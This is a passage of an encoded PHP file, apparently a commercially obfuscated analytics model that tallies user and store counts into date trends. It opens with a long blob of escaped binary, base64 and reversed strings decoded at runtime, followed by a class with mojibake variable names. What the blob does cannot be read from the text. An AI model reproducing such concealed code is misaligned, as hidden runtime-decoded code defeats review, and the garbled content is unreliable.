40\xce\x91\x2b\x53\x7a\x92\xe3\xb0\xb4\xd1\xeb\xe7".base64_decode('LIQekfkS4pIkQyEMzAXH5oWuCOxRgICHEIc185zlcTjKiwOB5DFbkrgQj15kJfJGznawRPo=')."\252\166\31\171\246\156\215\66\244\121\224\62\5\124\167\165\145\344\271\221\62\64\275\151\14\343\203\274\202\213\160\151\110\76\116\327\225\221\106\130\51\135\107\351\11\233\53\125\10\112\130\246\60"."\106\234\321\170\77\346\155\23\55\250\374\316\35\74\22\332\31\205\353\114\201\166\70\230\74\141\25\375\75\361\4\106\125\344\5\323\64\22\234\311\145\15\302\362\210\164\336\207\25\264\24\11\36".base64_decode('K+2IRuKRRvbCn1OTS2Gz2U7DotdNxeaM3bXjNkoMg4sYfoAANeQL2Sw3D8W0y5fGutJ/usg=')."\331\251\236\354\231\40\136\351\322\330\311\52\250\233\351\121\61\273\54\12\365\104\213\160\34\337\361\267\0\54\71\154\305\356\142\365\244\257\213\72\61\250\253\142\27\256\230\61\252\270\147\311\60"."\345\30\5\257\52\75\274\327\21\57\360\3\53\25\263\254\34\37\6\302\343\133\345\236\362\12\337\214\312\362\342\30\152\366\353\214\307\66\165\352\51\61\24\11\117\135\201\164\100\156\64\66\206".base64_decode('Q8H2uBoCwaC6Zp6vStw2NCzhAJl+N3KDpbxOetXnaFaJrqGnMXFutKpnHepY2qVpk7nmrak=')."\xaa\xaa\xf2\x56\x55\xa3\xff\xd9\x2d\xc\xe6\x10\xb4\x96\xf9\x30\x92\x50\xaa\xaa\x6a\xc9\xff\x34\x82\x9c\x88\x0\x9\x3a\x63\x10\x7b\x64\x7c\x1d\x10\x86\x75\x1d\x2a\x4\xeb\x28\xda\x2e\x17\x98\x50\xda\xd5\x88\x2f".base64_decode('iSq4ajAswugWUR/xmMtYrOP9VIVYBkBIF52Qkd78jIGH5X4HtbODA+pNHQpFm7BsP+kgqDs=').strrev('fŞ	H	1ynœiCUN\'¦Qï~W„Yx'."\r".''."\n".'hë0¹.É³'."\n".'ñ×…oHZÄĞŒ¿')."\xc\x90\xd4\xb6\x58\xfa\x95\x5c\xd\xe3\xa0\x7c\x80\x48\xa2\xf9\x25\x5e\x12\x4a\x73\xf7\x29\x38\xd8\xce\x73\xa2\xcf\x4a\x51\x37\x2f\xd0\x87\x25\x66\x64\xca\x1c\x56\x85\xcc\x82\x83\xa7\xf0\x10\xe9\x52\xbc\xfd\x64".base64_decode('JJmULlrjfmXrk4TOzdyEjRAIc8Txx4CRdvglUKWkct8uxIisJXFnSvzWNa6oF9e7VvQi4m8=')."\x1\xfe\xe0\x16\xb5\x8a\x66\xf5\x55\x80\xe3\xd0\x20\x79\x6b\x80\x3e\xf2\x4c\x94\x3c\xb5\x47\x16\xd\xb8\xed\x1e\x6c\x32\x6e\x8e\x93\xf\xb7\xbd\x21\xb\x49\xa3\xc7\x8e\xc6\x62\x9f\x63\x12\xc8\x20\x41\x6\xa0\x87"."\172\215\334\117\257\224\201\73\312\225\46\100\117\324\212\22\0\274\30\233\34\74\226\300\306\160\27\66\361\310\333\310\35\217\313\156\172\251\176\112\62\75\263\340\365\25\141\367\303\362\30\222\166"."\253\276\134\336\354\107\224\140\311\235\206\340\35\245\301\34\275\30\263\4\22\257\275\214\47\3\361\21\47\173\75\36\110\113\370\62\320\222\174\361\224\120\205\107\46\11\350\234\341\122\104\43\177"."\x17\x4f\x6\xe2\x6d\xb0\x6c\xe9\x45\x76\x20\xce\x3c\xf0\xfe\xda\x9\xe1\x35\xfb\xc\xa2\x63\xea\x10\x3b\xaf\x65\xad\x3e\xd9\x74\x85\xa1\x9\x2e\x85\x55\x55\xf2\xab\xa5\xaa\x83\x4c\x18\xad\x32\xc3\x32\xdc\x43\xc2"."\x84\xc3\x9\xa7\x30\xaa\xb0\x70\x9c\x1b\xc7\x9\xf3\x4b\xeb\x71\xa8\xe\x85\xd2\x49\x85\x33\x8\xb3\xd7\xae\x63\xe\xaf\xf6\x40\xa6\x30\x75\xeb\xea\xe4\x64\xce\xb8\x3f\x9d\x7d\x31\xfb\xf8\x1\xc3\xc2\xdd\xca\x5f".base64_decode('ipXP5HCXqrIuCc/oVtuGNpUgRCexFVEVWddxBrWcLUkhnDs7DkUbcPAZ48Fghb7CruCn5qc=').base64_decode('OcenOAG8Tmci6RI7/ZYT4bw6XSxqCeeSOMTrSkU7ZhSrTPfVgMHudPYuDeXRwizD71D++xA=')."\111\141\131\213\55\374\250\255\75\150\257\264\236\57\73\60\112\135\224\155\263\202\160\73\340\53\311\6\115\161\56\303\322\242\242\310\31\241\345\71\236\302\112\242\36\205\324\175\41\171\313\244\104"."\54\166\341\301\112\343\136\321\141\71\100\70\246\315\367\327\70\373\100\122\132\147\303\262\120\34\247\111\274\213\105\125\35\206\10\322\213\14\34\25\125\203\125\136\143\165\43\226\247\344\345\13\151"._kodDe('KeTAr/9p4v9mAT42N35e9xvCd23L4+ulehpkd5T0ILxe4c6oWKMVWY1OC3OXIIUIxBXMwSBg')."\101\322\311\353\11\63\237\304\253\244\344\64\47\153\107\365\176\71\110\254\34\330\24\21\76\363\345\54\260\217\65\211\27\341\251\31\110\330\5\331\143\233\364\254\6\12\111\57\257\110\322\253\267".base64_decode('WuFir0pzpoGZUgTBLyUBu1S90pU5ogmLFXr5obVLFmW38BRZ1GPX6nAGxGcVboElx6FssTs=').base64_decode('e9EyOQkpsygJjcPSlrh/J8dY+AGVTjaKpWJKFEWipB7l/l1h6q8UnQQRozozDPdW13iZ20g=')."\371\116\36\333\321\321\20\336\155\112\144\200\367\304\214\267\201\131\65\340\11\34\123\72\376\47\256\235\204\247\32\342\317\212\217\47\161\174\305\103\171\111\300\320\271\311\65\361\373\44\363\172\141".base64_decode('50QtsTFCZ6l42kM4uslhO+9CQPPDGQ8vpIjKUNdTpsOW0ZUJvOQjvwFDUol2iAsGCGTSd1g=').strrev('Å€r[Ì[›•âSÛÅ~Q¶ÊêÎÄ¨®M°çRY	TÂù¶,MÇ'."\0".'œ™ÁA»#ÔZö¤').strrev('¸@Æ¡-#„¡#Ã‚võ4ŒÈØğŠíRz|'."\r".'AÏÃµ£¾öØ~gXkAÍHê?j´âr').strrev('Ì„-"ı±,Êo’o›Eíéü¡ü½ëF5]‚s“.ò"QâZ«i’«ªˆ»a[#ãô¢[)')."\304\103\213\316\154\51\125\352\371\242\34\263\370\22\141\272\50\15\326\300\227\300\116\13\5\262\204\234\313\353\305\370\243\72\266\241\224\152\54\45\50\224\250\15\340\227\56\201\274\322\44\143\43"."\x99\x49\xcf\x4e\x54\x79\x23\x3b\x64\x58\x86\x60\x7\x2c\xc5\xa8\x9c\x7b\xa0\xa9\x2d\xd4\xae\x6\xc2\xe1\xc8\x72\x87\xd\xb2\x38\x7b\xc8\x73\xed\x4b\x52\x7e\x64\x4b\x1a\x19\x31\x8\xb4\x74\xd9\xff\xa4\xc\x71\xbc"."\x42\xe2\xd2\xc8\xd0\xe1\x93\x1d\xa2\xe6\xd8\x31\x19\x3c\xf\xcc\x5f\xce\xa1\x41\xe9\x11\xbc\x5c\x5e\x33\x2c\x5d\x2\xd0\xf7\xda\xaa\xe1\x5e\x9e\x96\x4e\x3b\x9e\xba\x4d\xf7\x49\xc1\x82\x73\xbd\x2d\x59\x94\x4a\xb"."\140\60\42\375\116\214\20\15\265\264\306\377\343\252\32\111\341\62\320\110\62\173\65\176\7\233\76\252\323\50\77\220\314\312\24\117\67\25\103\376\323\107\4\75\342\250\121\45\136\323\330\53\246".base64_decode('JtlLgaBPYaGISl3biiKQFJMfzclHvP4k5ICdugbZJSQcEJsZjAWZ4FLoFhft3LEWkm17mEY=')."\17\261\21\350\160\207\215\246\353\25\104\267\51\276\343\215\303\242\62\310\273\71\64\256\13\267\2\141\366\210\66\241\20\177\47\113\44\165\307\224\250\0\212\126\204\156\214\43\50\165\112\25\175".base64_decode('r5O/gaQsYp4mRAHEfWEwk7Md2/9W+VqONCQUgBVFea71o2POgnhg2WG0qcprJ+HDYlOIzTc=')."\xcd\xcc\x68\x11\xc0\xa1\x46\xb\xb3\xd6\x70\xb3\x6a\xfc\x6e\x54\xb6\xcf\x94\x7b\x9d\xf0\x73\x7c\x33\x8b\x3e\xc3\x4b\xb5\x13\x1e\xb4\x1f\xd1\xed\xe2\x87\xfb\x68\xf2\xff\x9b\x84\x34\x32\x26\x79\xe8\x75\x66\x52\x5c"."\x21\xcb\xbd\x7e\xa\x59\xe\xbf\x49\x98\x32\x87\x9d\x6f\xf3\x62\x88\xfb\x15\x42\xc7\xfb\x83\xd2\xc\x23\x7e\x13\xe4\x17\x13\x9d\x89\x3c\x45\xef\x77\x29\xe4\x81\x75\x5\x31\x23\x18\x7b\x6c\x4\xc4\x76\xbf\x4\x59".base64_decode('Kno6/emGX7YauitB+RwUWclJsTFlpJN5bt4lAG26UEmQVIix5DT2kDx5nxSay58MK/U0JXY=')."\153\352\174\371\114\74\50\47\226\136\347\3\133\334\246\300\22\123\310\262\35\117\272\305\315\270\326\357\241\244\212\231\242\10\65\214\312\337\262\251\77\151\5\212\144\152\303\44\37\357\305\22\2"."\x7b\xff\x35\xe9\x21\xaf\x8f\x52\xbe\xe8\x7e\x93\x4c\x9a\x9f\x9c\xfd\xca\xa9\xfb\x89\xb7\x4e\xb0\x3d\x74\xdc\xe3\xcb\xa3\x2d\x9a\xce\x96\x10\x7\x1a\x5\xf9\xb5\x5c\x4e\x1c\xa2\xc8\x2b\x2e\xfa\xd7\x71\x45\x1b\xe2"."\72\343\255\52\161\132\242\122\43\211\230\240\71\351\140\223\2\341\220\263\220\15\321\303\34\7\64\57\155\36\145\337\326\364\200\107\334\364\5\164\124\317\16\172\272\13\35\46\147\311\116\334\271"."\102\36\361\43\276\307\366\27\237\320\143\263\65\340\50\330\114\210\331\147\15\230\144\217\346\223\167\167\200\240\54\142\356\146\220\314\351\25\124\342\230\323\230\252\220\264\115\237\172\45\114\103\146".base64_decode('bqWhRA4nfNYLbIJdf6WrHnbtwHzCpvlujL84KwX5jHC+n0enDvlp0vv4VguHhXAhe24SZkE=').base64_decode('7jdii9+7ZW/bsrkHD9uWeK12wsduPeJW+Gc9yyfuIOfQWDpfLuaiCd/NFG2I3HshPhiuBFE=').base64_decode('94DFzWJVtjCCcDzFK7WaAko85yt1g9TuQj7tIfYgHmaCWfJFYMcjge4BLfGm8OdmCNcvyFY=')."\x30\xe9\x64\x9b\xb5\x8b\x7a\xf3\xec\xb0\xdc\x8d\x66\x38\x28\x1e\xad\xe0\xe2\x62\x22\x75\x29\x5d\xb4\xc2\xac\xcc\x24\x6b\x66\xcd\x59\x20\xab\x5c\xc4\x10\x8a\x23\x64\xf6\x24\x8\xfd\x1\x21\x49\x10\x85\xe2\xe8\x6"."\217\302\374\130\313\354\203\104\72\357\363\24\77\77\355\132\102\376\263\11\43\166\57\24\125\62\23\346\371\225\172\161\122\242\123\311\176\115\132\121\135\226\107\46\66\6\262\304\254\243\153\250\170"."\x74\xda\x59\x16\x95\x3f\x4a\xb4\x43\x14\x2b\x4d\x16\xfa\x90\xb0\x99\xc6\x3b\xff\xc\x3e\x66\xb0\xf3\x9a\x73\x43\x5b\x6a\xdf\x46\x7a\x82\x6d\x12\xb1\xa6\x58\x84\x9c\xa6\x5c\xa0\xe3\x11\xd1\xd2\xc6\x4e\xce\xd1\x36"."\xdd\xa\x2a\x9c\x1c\x2f\xac\x44\xd9\x1a\xc9\xa6\x61\xdd\xc7\x2e\x33\xc4\x6c\x93\x38\xd1\x7f\x30\x80\x6c\x8f\x46\xb7\x73\xc2\x86\xd\x37\xdf\xb1\xb5\x77\xf6\x82\xff\x64\xc6\x66\x4a\x3c\x16\x2d\x99\xe9\x7c\x46\x1b"."\250\250\310\367\246\136\315\366\112\304\51\51\70\165\73\102\6\33\330\205\330\102\73\333\355\312\36\45\23\171\364\170\224\211\220\212\345\105\351\115\151\341\254\121\222\24\161\152\166\341\175\2\15"."\4\271\157\355\224\271\344\167\153\311\145\145\341\153\210\114\135\307\64\226\34\303\313\227\175\111\106\362\374\50\316\132\172\5\130\350\255\210\242\13\132\4\223\233\330\155\220\152\6\132\370\125\161".base64_decode('TTJIdCrTQDoUkwT3vfRAvCl/S69LozUhwm5voOo49sEoLFyhS/wr6QKyPiNMQzyFTkTnGSA=')."\64\313\16\11\34\73\57\376\114\252\143\47\146\271\337\112\106\222\245\343\171\226\144\321\313\364\300\106\311\115\76\132\232\264\20\263\52\366\113\137\355\205\214\10\110\12\152\262\175\343\221\16\277".strrev('³ê…¹sOª¡l<_ˆ. ü	Gb©Ï¯Wÿà™úÿÆ]³~œØêuõë–o0c‹¡AØ'."\r".'')."\x5d\xd\x72\xae\xba\x93\x81\xb8\xd0\x28\xf8\x86\x4\xaf\x21\x61\x6e\xda\xce\xbc\x55\x32\x27\x96\x1a\x3b\xec\xd3\xd2\x69\x69\x6d\x2e\xbd\x4d\x2a\x7a\x7\x1e\xd1\xe4\x0\x7f\xf8\xbb\x54\xc0\x7d\x7d\xd9\xfd\x26\x7c"."\27\121\47\263\107\335\173\4\173\301\260\122\311\344\227\244\135\257\310\223\274\20\104\312\205\133\74\2\62\333\60\261\155\135\211\231\101\101\114\232\27\74\57\153\44\6\112\34\371\23\73\140\347".strrev('P\\î3ìE@:™E0'."\n".'›Á~¦U„­ó¶9"'."\r".'È0Àæ¼K?x¾ÌŠn$dª&„Sğ’Ó')."\36\67\301\343\174\214\56\34\51\332\134\17\135\123\44\346\56\31\54\72\44\176\115\344\251\134\301\375\52\25\335\273\311\251\144\43\221\342\2\70\363\221\223\340\333\13\116\365\36\36\171\262\63"."\xaa\xf2\xba\x0\xd5\x5e\x57\x76\xfc\x39\x70\xe7\xbc\x72\xbc\x4f\x4d\xd\x6b\xd0\x64\x8c\x62\x35\xe\x53\xe7\x91\x63\x33\x72\xa8\xee\x2d\x4e\x43\xe7\x50\x4c\xe0\x4c\x30\x8b\x4b\x33\x15\x5e\x29\xa1\xd2\xc4\x5f\x72"."\177\60\346\324\221\67\111\337\72\241\134\265\45\31\215\47\44\275\261\133\374\244\340\351\76\271\41\362\301\262\363\164\12\133\52\212\343\332\170\44\32\124\227\207\260\243\216\320\251\301\116\346\150".base64_decode('2jDJwyssy862CnJ1D+YI2kg1i7cGLR1xUEmJLbwl25lcIz9cdl7+lu6LMC9lslrViYzv+jg=')."\247\353\342\122\150\11\63\157\311\256\106\35\221\130\362\63\121\154\224\351\2\372\230\111\110\147\26\115\172\75\141\353\111\5\13\23\216\375\105\327\354\252\131\75\237\225\35\212\347\230\263\77\7"."\23\66\72\261\131\136\146\335\314\160\112\246\63\251\173\241\122\161\210\110\143\266\203\232\304\3\77\356\207\175\234\17\371\324\112\372\136\372\106\222\343\5\260\242\101\152\67\33\205\230\343\212\303"."\154\144\342\130\274\123\346\107\351\354\111\27\154\55\350\307\76\316\360\315\26\77\41\104\120\323\257\124\63\52\63\224\302\372\11\241\246\42\334\271\170\177\12\45\331\371\321\110\76\232\151\57\362"."\375\347\274\244\46\245\47\312\53\252\217\162\250\245\300\70\102\6\111\306\2\150\153\230\164\76\366\106\42\11\230\71\77\207\34\244\343\156\247\265\1\277\377\133\264\54\27\214\260\24\115\122\61"."\x27\xba\xe8\x17\xbb\x31\x8\x9\x1f\x54\x24\x9a\x1e\xd9\x5\x86\x34\xee\xe6\xcd\x9d\xaa\xd3\xb1\xed\x96\x6c\x13\x12\x84\x99\x4\x8b\x8f\x9f\xc5\xa9\xb8\x24\xeb\xb2\x64\x78\xdf\x2e\xe4\xd\x17\x5c\x62\xbe\x62\x5"."\325\206\204\344\56\166\216\311\144\263\66\124\2\65\251\273\335\364\41\10\107\45\222\277\344\215\104\334\103\322\207\345\322\1\117\334\373\161\40\26\103\205\267\22\51\275\70\162\24\315\304\260\122".base64_decode('zSfM0Jlc9obCiUqA6JNX3JBH2qVjSydh4UObwpVRokin7xWOxscM4ZAbiV4H1KV3wHo/Jp4=')."\xba\xa2\x40\x13\x26\x65\x5f\x52\x61\x26\x91\x80\x9e\xe\x4b\xd9\xc9\xe6\x8\x13\x26\x88\x95\x2e\x44\x50\xa5\xb3\x8b\x25\xa7\x35\x22\x82\x9\x40\x72\x2e\x8e\xe5\x8d\x37\xc\x30\xa3\x72\xa4\xa3\x3a\xee\xa1\x25\xdb".base64_decode('ZEG+FJghpxY0LuCMovi6q/ZyAnfLaArHO48yfNiwEylpT18cWQzPF3U2VKB0O9y1ZX3t1nQ=').base64_decode('iEyK6iPZOsXNEmlojUomo1E4pdgzOdJO0AU4LY3CaYuiWeKifiXpbK1gTdC84s4DzVmyRIM=')."\x85\x7e\x49\x42\x9d\xa8\x3f\x4b\x22\x17\x17\x7\x94\xe8\xc6\x26\xaa\xb6\xd2\xb5\x10\x1a\x32\x97\x75\x49\xa9\x5a\x94\x44\x9e\xb0\x16\x6e\x6c\x21\x95\xe0\x1d\x72\xa9\x18\x87\x89\x96\x73\x45\x29\xc5\xb7\x59\x4c\x9"."\116\115\271\320\204\266\133\302\236\251\170\311\20\161\45\254\253\150\221\130\76\222\375\141\226\210\226\115\265\112\33\163\105\113\162\31\313\151\145\345\202\313\35\4\336\334\151\200\131\143\42\41\55".base64_decode('bQwIK1Z22wW0ItwkdCBr8uUpKSyXsWwVyLv7uSg3J+lnC5IH/ZKXbzxYjVWsIkpr/HakMPQ=')."\243\73\160\323\66\22\272\323\115\277\354\26\223\306\263\102\322\222\322\334\245\257\26\112\65\207\275\117\11\55\56\1\321\117\237\70\72\242\371\211\266\110\64\341\270\47\107\105\22\70\247\243\247"."\xfd\x8d\xf8\x30\x8e\x9f\xf3\x12\xf\xf2\x74\x9\xa7\xd1\x31\x33\x6f\x7b\x70\x5c\xdc\xcc\x91\xdf\x6\xd3\xb6\x85\xf1\xc\xd5\x5b\x11\x41\x1c\xaf\xc3\x1e\xc9\x36\xc\x7d\x89\x43\x5d\x5c\x29\x72\x44\x48\xc8\x96\x70"."\54\362\11\166\7\130\17\24\323\151\54\341\163\216\0\76\172\344\1\171\231\205\203\305\346\202\313\102\102\0\6\314\144\257\71\302\174\121\42\272\222\72\111\34\63\152\156\331\162\310\175\157\133"."\xb6\x74\x23\xae\x59\x2c\x3f\x8d\xf1\xc3\x9b\x50\x5e\x92\x7\x3c\x47\xeb\x5b\x93\xeb\x77\x24\xa7\xef\x66\x72\xe3\xf5\xcf\xca\x1\x8e\x1a\x44\x16\xf4\x41\x18\xa2\xf7\x85\x7b\x7c\xb1\x78\xac\x28\xaa\x23\x10\x8b\x2d"."\x8f\x44\x9b\xe8\xfb\x31\x45\xd1\x24\x95\x64\x4f\x58\x14\xd5\xd1\x1a\x69\x9f\x28\x2e\xd8\x16\x8\x85\x8b\xe2\xb0\xe9\x61\xbb\x2a\xbc\x9a\xd2\xa8\x50\x7\xa9\x25\x39\x6a\x9f\xa8\x16\xa1\xc6\x25\xa2\x26\xc5\xce\x64"."\331\311\136\30\36\2\25\343\42\235\164\345\122\46\73\300\142\370\61\55\315\124\113\322\111\210\236\21\156\157\105\32\247\306\114\36\177\213\371\247\346\37\316\107\33\135\226\300\214\260\41\43\154"."\110\330\16\171\107\163\0\305\357\356\160\376\300\345\174\141\315\342\163\130\275\110\160\62\207\10\123\222\150\123\136\357\311\331\47\127\235\221\350\31\45\273\113\76\47\51\76\303\43\261\242\73\160"."\x35\x4f\x31\xc1\x52\x75\x8d\xd9\x2b\x9d\xd1\xd1\x3d\x17\xdc\xd0\x87\xe\x96\x4c\x47\xe9\xb7\x23\xda\xd6\xfa\x4b\x9a\x82\x50\x85\x37\xe6\x19\x42\x15\xfd\x7f\x0\xc8\x1a\x2e\xdb\x8b\xbb\x0\x0"."".""."".""."", 10, -8))); goto BŒëÃÊ†¬; c»á™å¼: class AnalysisModel extends ModelBaseLight { public function init($ä½Âï„„) { $¢œ—ğº† =& $_SERVER[«òÑğ]; $Ğ©óıÍá = array($¢œ—ğº†[670] => array($¢œ—ğº†[33] => $¢œ—ğº†[1913], $¢œ—ğº†[353] => array($¢œ—ğº†[285], $¢œ—ğº†[849], $¢œ—ğº†[1914], $¢œ—ğº†[1915])), $¢œ—ğº†[1916] => array($¢œ—ğº†[33] => $¢œ—ğº†[1917], $¢œ—ğº†[353] => array($¢œ—ğº†[285], $¢œ—ğº†[847], $¢œ—ğº†[1918], $¢œ—ğº†[1919], $¢œ—ğº†[1920]))); if (!isset($Ğ©óıÍá[$ä½Âï„„])) { return !1; } $this->optionType = $Ğ©óıÍá[$ä½Âï„„][$¢œ—ğº†[33]]; $this->field = $Ğ©óıÍá[$ä½Âï„„][$¢œ—ğº†[353]]; return !0; } public function listData($á˜´˜’ = false, $  µöãÁ = "\155\157\144\151\x66\171\124\151\x6d\x65", $›İ‘ı¥Ì = false) { return parent::listData($á˜´˜’, $  µöãÁ, $›İ‘ı¥Ì); } public function trendList($î©ÚÑÑª) { $ö¦×î¥ =& $_SERVER[«òÑğ]; $ÜëÉñÎ = $this->listData(); if ($ÜëÉñÎ) { $ŠÌİÏ‡Å = end($ÜëÉñÎ); $Ñ·ìæ÷© = date($ö¦×î¥[1921], strtotime($ö¦×î¥[1922])); if ($ŠÌİÏ‡Å[$ö¦×î¥[285]] == $Ñ·ìæ÷©) { return $ÜëÉñÎ; } $­µº¼½ = strtotime($ŠÌİÏ‡Å[$ö¦×î¥[285]]); } if (!isset($­µº¼½)) { $Û¿ßôªÚ = $î©ÚÑÑª == $ö¦×î¥[670] ? $ö¦×î¥[602] : $ö¦×î¥[914]; $­µº¼½ = Model($Û¿ßôªÚ)->min($ö¦×î¥[234]); } $îÏÑ¤Œ© = $ö¦×î¥[1923] . ucfirst($î©ÚÑÑª); $×ÏğÖ­ = $this->dateList($­µº¼½); foreach ($×ÏğÖ­ as $Ñ·ìæ÷©) { $this->{$îÏÑ¤Œ©}($Ñ·ìæ÷©); } return $this->listData(); } private function dateList($˜¸ËáÀØ) { $È­ßğ¬Ã =& $_SERVER[«òÑğ]; $€ÈÚƒâ„ = $˜¸ËáÀØ; $ô­‡ú = strtotime($È­ßğ¬Ã[1922]); $ôóµŒÖ = array(); while ($€ÈÚƒâ„ <= $ô­‡ú) { $ôóµŒÖ[] = date($È­ßğ¬Ã[1921], $€ÈÚƒâ„); $€ÈÚƒâ„ = strtotime($È­ßğ¬Ã[1924], $€ÈÚƒâ„); } return $ôóµŒÖ; } public function _recordUser($Ñæ’´ø = '') { $Õëä²€ï =& $_SERVER[«òÑğ]; $‹‹ÙáÆÉ = strtotime(date($Õëä²€ï[1925], strtotime($Ñæ’´ø))); $ÎÓ­‚É = strtotime(date($Õëä²€ï[1926], strtotime($Ñæ’´ø))); $µ½˜÷ç­ = array($Õëä²€ï[234] => array($Õëä²€ï[1100], $ÎÓ­‚É)); $ãåğû® = Model($Õëä²€ï[602])->where($µ½˜÷ç­)->count($Õëä²€ï[1784]); $µ½˜÷ç­[$Õëä²€ï[234]] = array($Õëä²€ï[411], array($‹‹ÙáÆÉ, $ÎÓ­‚É)); $åäÄˆíã = Model($Õëä²€ï[602])->where($µ½˜÷ç­)->count($Õëä²€ï[1784]); $µ½˜÷ç­[$Õëä²€ï[33]] = $Õëä²€ï[1927]; $›ÈÑ§Ã = Model($Õëä²€ï[1928])->where($µ½˜÷ç­)->count($Õëä²€ï[1929]); $˜¦Çò×â = array($Õëä²€ï[285] => $Ñæ’´ø, $Õëä²€ï[849] => (int) $ãåğû®, $Õëä²€ï[1914] => (int) $åäÄˆíã, $Õëä²€ï[1915] => (int) $›ÈÑ§Ã); return $this->insert($˜¦Çò×â); } public function _recordStore($ô’š¯Æí = '') { $‰†Ğñ±¬ =& $_SERVER[«òÑğ]; $Ç¼ˆ­Ââ = strtotime(date($‰†Ğñ±¬[1926], strtotime($ô’š¯Æí))); $ïˆ¾îã = array($‰†Ğñ±¬[234] => array($‰†Ğñ±¬[1100], $Ç¼ˆ­Ââ)); $¿Æ†œÍÒ = Model($‰†Ğñ±¬[549])->where($ïˆ¾îã)->sum($‰†Ğñ±¬[79]); $ïˆ¾îã[$‰†Ğñ±¬[488]] = 0; $Öé¿Æ†ó = Model($‰†Ğñ±¬[914])->where($ïˆ¾îã)->sum($‰†Ğñ±¬[79]); $ïˆ¾îã[$‰†Ğñ±¬[191]] = 1; $±ìê«©³ = Model($‰†Ğñ±¬[914])->where($ïˆ¾îã)->sum($‰†Ğñ±¬[79]); $ïˆ¾îã[$‰†Ğñ±¬[191]] = 2; $ºì º°ª = Model($‰†Ğñ±¬[914])->where($ïˆ¾îã)->sum($‰†Ğñ±¬[79]); $ÇÛî§¦« = array($‰†Ğñ±¬[285] => $ô’š¯Æí, $‰†Ğñ±¬[847] => (int) $Öé¿Æ†ó, $‰†Ğñ±¬[1918] => (int) $¿Æ†œÍÒ, $‰†Ğñ±¬[1919] => (int) $±ìê«©³, $‰†Ğñ±¬[1920] => (int) $ºì º°ª); return $this->insert($ÇÛî§¦«); } public function trend($ÅÈßşé, $ôŒÓóÔØ) { $£¼ †ñ† =& $_SERVER[«òÑğ]; if (!$this->init($ÅÈßşé)) { return !1; } $‘¬ÈÉáÊ = $this->trendList($ÅÈßşé); if ($‘¬ÈÉáÊ && $ôŒÓóÔØ != $£¼ †ñ†[1756]) { $Š¾ù©Š‘ = $‘¬ÈÉáÊ[0][$£¼ †ñ†[285]]; $Ï‹úÆĞà = $this->validDate($ôŒÓóÔØ, $Š¾ù©Š‘); $îÛåíô£ = array(); $øÓë†€Å = array_to_keyvalue($‘¬ÈÉáÊ, $£¼ †ñ†[285]); foreach ($Ï‹úÆĞà as $Û¤áúÃŒ) { if (isset($øÓë†€Å[$Û¤áúÃŒ])) { $×Í¹äÙù = $øÓë†€Å[$Û¤áúÃŒ]; } else { $×Í¹äÙù = end($‘¬ÈÉáÊ); $×Í¹äÙù[$£¼ †ñ†[285]] = $Û¤áúÃŒ; if ($ÅÈßşé == $£¼ †ñ†[670]) { $×Í¹äÙù[$£¼ †ñ†[1914]] = $×Í¹äÙù[$£¼ †ñ†[1915]] = 0; } } $îÛåíô£[] = $×Í¹äÙù; } $‘¬ÈÉáÊ = $îÛåíô£; } $³«…Ê² = array($£¼ †ñ†[670] => array($£¼ †ñ†[849] => LNG($£¼ †ñ†[1930]), $£¼ †ñ†[1914] => LNG($£¼ †ñ†[1931]), $£¼ †ñ†[1915] => LNG($£¼ †ñ†[1932])), $£¼ †ñ†[1916] => array($£¼ †ñ†[847] => LNG($£¼ †ñ†[1933]), $£¼ †ñ†[1918] => LNG($£¼ †ñ†[1934]), $£¼ †ñ†[1919] => LNG($£¼ †ñ†[1935]), $£¼ †ñ†[1920] => LNG($£¼ †ñ†[1936]))); $Ãëäš‹Á = array($£¼ †ñ†[670] => $£¼ †ñ†[1937], $£¼ †ñ†[1916] => $£¼ †ñ†[79]); if (empty($‘¬ÈÉáÊ)) { $Û¤áúÃŒ = date($£¼ †ñ†[1921], strtotime($£¼ †ñ†[1922])); $“ ‰ğ¸ = array($£¼ †ñ†[285] => $Û¤áúÃŒ); foreach ($³«…Ê²[$ÅÈßşé] as $äÍ™’Ù => $ª¡ñôß») { $“ ‰ğ¸[$äÍ™’Ù] = 0; } $‘¬ÈÉáÊ[] = $“ ‰ğ¸; } $ìÓ¬ß¶ˆ = array(); foreach ($‘¬ÈÉáÊ as $ª¡ñôß») { if ($ÅÈßşé == $£¼ †ñ†[1916] && $ª¡ñôß»[$£¼ †ñ†[1918]] > $ª¡ñôß»[$£¼ †ñ†[847]]) { $ª¡ñôß»[$£¼ †ñ†[1918]] = $ª¡ñôß»[$£¼ †ñ†[847]]; } foreach ($³«…Ê²[$ÅÈßşé] as $äÍ™’Ù => $©ü†Ğ÷ß) { $×Í¹äÙù = array($£¼ †ñ†[285] => $ª¡ñôß»[$£¼ †ñ†[285]], $£¼ †ñ†[1671] => $©ü†Ğ÷ß); $×Í¹äÙù[$Ãëäš‹Á[$ÅÈßşé]] = isset($ª¡ñôß»[$äÍ™’Ù]) ? $ª¡ñôß»[$äÍ™’Ù] : 0; $ìÓ¬ß¶ˆ[] = $×Í¹äÙù; } } return $ìÓ¬ß¶ˆ; } public function validDate($Åß¹£ş, $çì¾Êµ) { $°ˆÙÌ§— =& $_SERVER[«òÑğ]; $öÆ¶ìÅÁ = date($°ˆÙÌ§—[1921], strtotime($°ˆÙÌ§—[1922])); $ÌÕÊÆş = array($öÆ¶ìÅÁ); switch ($Åß¹£ş) { case $°ˆÙÌ§—[1763]: $²¤¨Äèí = mktime(0, 0, 0, date($°ˆÙÌ§—[1938]), date($°ˆÙÌ§—[1463]) - date($°ˆÙÌ§—[1553]) + 7 - 7, date($°ˆÙÌ§—[1939])); $ˆœÏûú = 0; do { $ÆÛ˜˜ÖÜ = date($°ˆÙÌ§—[1921], $²¤¨Äèí - 3600 * 24 * 7 * $ˆœÏûú); $ÌÕÊÆş[] = $ÆÛ˜˜ÖÜ; $ˆœÏûú++; } while ($çì¾Êµ < $ÆÛ˜˜ÖÜ); break; case $°ˆÙÌ§—[1761]: $ˆœÏûú = 1; do { $™‡†¯¬É = date($°ˆÙÌ§—[1940], strtotime("\x2d\x20{$ˆœÏûú}\x20\x6d\x6f\x6e\164\x68\x73")); $ÌÕÊÆş[] = $™‡†¯¬É; $ˆœÏûú++; } while ($çì¾Êµ < $™‡†¯¬É); break; case $°ˆÙÌ§—[1941]: $Ñ×ÔØé  = (int) date($°ˆÙÌ§—[1939], strtotime($çì¾Êµ)); $ù‰Ÿûè = (int) date($°ˆÙÌ§—[1939]); if ($Ñ×ÔØé  >= $ù‰Ÿûè) { break; } for ($Ñ×ÔØé ; $Ñ×ÔØé  < $ù‰Ÿûè; $Ñ×ÔØé ++) { $ÌÕÊÆş[] = $Ñ×ÔØé  . 